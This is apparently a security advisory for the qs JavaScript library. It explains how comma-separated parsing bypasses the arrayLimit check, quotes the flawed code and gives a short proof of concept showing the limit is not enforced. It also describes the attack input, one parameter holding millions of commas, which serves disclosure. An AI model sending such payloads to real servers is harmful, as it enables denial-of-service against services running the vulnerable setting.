the `arraylimit` option in qs does not enforce limits for comma-separated values when `comma: true` is enabled, allowing attackers to cause denial-of-service via memory exhaustion. this is a bypass of the array limit enforcement, similar to the bracket notation bypass addressed in ghsa-6rw7-vpxm-498p (cve-2025-15284).

### details
when the `comma` option is set to `true` (not the default, but configurable in applications), qs allows parsing comma-separated strings as arrays (e.g., `?param=a,b,c` becomes `['a', 'b', 'c']`). however, the limit check for `arraylimit` (default: 20) and the optional throwonlimitexceeded occur after the comma-handling logic in `parsearrayvalue`, enabling a bypass. this permits creation of arbitrarily large arrays from a single parameter, leading to excessive memory allocation.

**vulnerable code** (lib/parse.js: lines ~40-50):
```js
if (val && typeof val === 'string' && options.comma && val.indexof(',') > -1) {
    return val.split(',');
}

if (options.throwonlimitexceeded && currentarraylength >= options.arraylimit) {
    throw new rangeerror('array limit exceeded. only ' + options.arraylimit + ' element' + (options.arraylimit === 1 ? '' : 's') + ' allowed in an array.');
}

return val;
```
the `split(',')` returns the array immediately, skipping the subsequent limit check. downstream merging via `utils.combine` does not prevent allocation, even if it marks overflows for sparse arrays.this discrepancy allows attackers to send a single parameter with millions of commas (e.g., `?param=,,,,,,,,...`), allocating massive arrays in memory without triggering limits. it bypasses the intent of `arraylimit`, which is enforced correctly for indexed (`a[0]=`) and bracket (`a[]=`) notations (the latter fixed in v6.14.1 per ghsa-6rw7-vpxm-498p).

### poc
**test 1 - basic bypass:**
```
npm install qs
```

```js
const qs = require('qs');

const payload = 'a=' + ','.repeat(25);  // 26 elements after split (bypasses arraylimit: 5)
const options = { comma: true, arraylimit: 5, throwonlimitexceeded: true };

try {
  const result = qs.parse(payload, options);
  console.log(result.a.length);  // outputs: 26 (bypass successful)
} catch (e) {
  console.log('limit enforced:', e.message);  // not thrown
}
```
**configuration:**
- `comma: true`
- `arraylimit: 5`
- `throwonlimitexceeded: true`

expected: throws "array limit exceeded" error.
actual: parses successfully, creating an array of length 26.
